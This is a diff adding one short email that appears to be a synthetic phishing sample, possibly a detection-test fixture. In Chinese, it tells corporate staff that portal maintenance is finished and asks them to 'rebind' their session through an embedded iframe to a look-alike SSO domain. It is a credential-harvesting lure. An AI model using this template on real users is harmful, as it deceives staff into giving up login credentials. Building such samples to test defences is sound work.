@@ -1,0 +1,10 @@
+From: =?utf-8?B?6Zeo5oi3?= <portal@corp-sso-gw.example>
+To: staff@corp.internal
+Date: Mon, 07 Sep 2026 09:13:00 +0800
+Message-ID: <0003-b15@synth.example>
+Subject: 门户维护完成，请重新绑定
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+
+
+<html><body><p>门户维护完成，为同步您的会话请重新绑定：</p><iframe src='https://sso-bind-gate.example.org/rebind' width='100%' height='360'></iframe></body></html>
